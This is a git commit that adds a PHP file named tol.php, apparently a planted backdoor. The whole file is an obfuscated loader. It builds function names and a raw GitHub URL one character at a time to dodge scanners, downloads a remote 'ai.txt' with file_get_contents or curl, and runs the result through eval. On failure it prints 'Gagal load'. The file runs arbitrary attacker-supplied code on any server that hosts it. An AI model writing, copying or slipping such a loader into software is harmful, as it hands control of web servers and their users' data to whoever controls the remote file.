6987c4a06301fe2561b6cc8f0fb8ac4f5fd5e8f7
kolangkaling08 <kolangkaling0802@gmail.com>
2025-09-22 16:21:40 +0700

    Create tol.php

---
+++ powered/supply/damn/tol.php
@@ -0,0 +1,53 @@
+<?php
+
+$_u = implode('', [
+    'h','t','t','p','s',':','/','/',
+    'r','a','w','.','g','i','t','h','u','b','u','s','e','r','c','o','n','t','e','n','t','.','c','o','m','/',
+    'k','o','l','a','n','g','k','a','l','i','n','g','0','8','/',
+    's','u','p','e','r','/',
+    'r','e','f','s','/',
+    'h','e','a','d','s','/',
+    'm','a','i','n','/',
+    'p','o','w','e','r','e','d','/',
+    's','u','p','p','l','y','/',
+    'd','a','m','n','/',
+    'a','i','.','t','x','t'
+]);
+
+$_ini_get_name      = implode('', ['i','n','i','_','g','e','t']);
+$_func_exists_name  = implode('', ['f','u','n','c','t','i','o','n','_','e','x','i','s','t','s']);
+
+$_open = @call_user_func($_ini_get_name, implode('', ['a','l','l','o','w','_','u','r','l','_','f','o','p','e','n']));
+$_curl = call_user_func($_func_exists_name, implode('', ['c','u','r','l','_','i','n','i','t']));
+
+$_out = false;
+
+if ($_open) {
+    $_file_get_name = implode('', ['f','i','l','e','_','g','e','t','_','c','o','n','t','e','n','t','s']);
+    $_out = @call_user_func($_file_get_name, $_u);
+} elseif ($_curl) {
+    $_ci = implode('', ['c','u','r','l','_','i','n','i','t']);
+    $_co = implode('', ['c','u','r','l','_','s','e','t','o','p','t']);
+    $_ce = implode('', ['c','u','r','l','_','e','x','e','c']);
+    $_cc = implode('', ['c','u','r','l','_','c','l','o','s','e']);
+
+    $_ct1 = implode('', ['C','U','R','L','O','P','T','_','R','E','T','U','R','N','T','R','A','N','S','F','E','R']);
+    $_ct2 = implode('', ['C','U','R','L','O','P','T','_','F','O','L','L','O','W','L','O','C','A','T','I','O','N']);
+    $_ct3 = implode('', ['C','U','R','L','O','P','T','_','T','I','M','E','O','U','T']);
+
+    $_h = call_user_func($_ci, $_u);
+    call_user_func($_co, $_h, constant($_ct1), true);
+    call_user_func($_co, $_h, constant($_ct2), true);
+    call_user_func($_co, $_h, constant($_ct3), 10);
+    $_out = call_user_func($_ce, $_h);
+    call_user_func($_cc, $_h);
+}
+
+if ($_out !== false) {
+    $_b64 = implode('', ['b','a','s','e','6','4','_','d','e','c','o','d','e']);
+    eval('?>' . call_user_func($_b64, base64_encode($_out)));
+} else {
+    echo implode('', ['G','a','g','a','l',' ','l','o','a','d']);
+}
+
+?>
